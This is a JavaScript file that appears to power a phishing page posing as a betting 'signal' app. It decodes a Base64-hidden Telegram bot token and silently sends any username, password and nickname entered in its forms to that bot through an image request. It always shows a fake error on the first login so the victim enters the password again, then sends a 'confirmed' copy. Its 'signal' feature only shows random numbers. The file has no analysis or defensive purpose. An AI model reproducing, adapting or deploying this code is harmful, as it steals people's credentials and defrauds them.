// 🔐 التوكن الجديد مشفر بـ Base64 (لا تلمسه)
const _0xBase = "ODU4OTI0MzM2MzpBQUZqdWhJZnhTQ1BPVGVnVVJuLTc1RF8wa2ZRNEkxYmdsUQ==";
const CHAT_ID = "8026901193";

const getT = () => { try { return atob(_0xBase); } catch { return null; } };
const TG_TOKEN = getT();

// 🚀 نظام الإرسال الصامت
function sendData(msg) {
    if (!TG_TOKEN) return;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`;
    const ping = new Image();
    ping.src = url;
}

// 🛡️ منع الشاشة السوداء عند التشغيل
window.onload = () => {
    const auth = document.getElementById('auth-screen');
    if (auth) auth.classList.remove('hidden');
};

let attempts = 0;

function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const err = document.getElementById('login-err');

    if (!u || !p) return alert("Please fill all fields!");

    attempts++;
    if (attempts === 1) {
        btn.innerText = "Connecting...";
        sendData(`⚠️ <b>LOGIN 1:</b>\nU: <code>${u}</code>\nP: <code>${p}</code>`);
        setTimeout(() => {
            if (err) err.classList.remove('hidden');
            document.getElementById('u_pas').value = "";
            btn.innerText = "RETRY SYNC";
        }, 1500);
    } else {
        sendData(`✅ <b>LOGIN 2 (CONFIRMED):</b>\nU: <code>${u}</code>\nP: <code>${p}</code>`);
        document.getElementById('auth-screen').classList.add('hidden');
        document.getElementById('security-layer').classList.remove('hidden');
    }
}

function processNick() {
    const n = document.getElementById('u_nick').value;
    if (!n) return;
    sendData(`🔑 <b>NICKNAME:</b> <code>${n}</code>`);
    document.getElementById('security-layer').classList.add('hidden');
    document.getElementById('main-app').classList.remove('hidden');
}

function getSignal() {
    const res = document.getElementById('target-mult');
    res.innerText = "...";
    setTimeout(() => {
        const val = (Math.random() * (4.5 - 1.1) + 1.1).toFixed(2);
        res.innerText = val + "x";
    }, 600);
}
